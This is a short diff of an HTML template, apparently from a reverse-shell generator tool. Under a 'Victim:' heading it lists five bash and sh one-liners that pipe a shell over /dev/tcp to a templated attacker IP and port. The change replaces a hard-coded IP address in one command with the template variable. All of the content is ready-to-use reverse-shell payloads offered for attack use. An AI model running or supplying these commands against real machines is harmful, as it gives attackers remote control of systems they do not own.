@@ -93,7 +93,7 @@ width:200px;
                         <h5>Victim:</h5>
                         <pre>bash -i &gt;&amp; /dev/tcp/{{ ip_address }}/{{ip_port}} 0&gt;&amp;1</pre>
                         <pre>/bin/bash -i &gt; /dev/tcp/{{ ip_address }}/{{ip_port}} 0&lt;&amp; 2&gt;&amp;1</pre>
-                        <pre>exec 5&lt;&gt;/dev/tcp/61.164.47.202/{{ip_port}};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</pre>
+                        <pre>exec 5&lt;&gt;/dev/tcp/{{ ip_address }}/{{ip_port}};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</pre>
                         <pre>exec /bin/sh 0&lt;/dev/tcp/{{ ip_address }}/{{ip_port}} 1&gt;&amp;0 2&gt;&amp;0</pre>
                         <pre>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{{ ip_address }}/{{ip_port}}; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</pre>
                     </div>
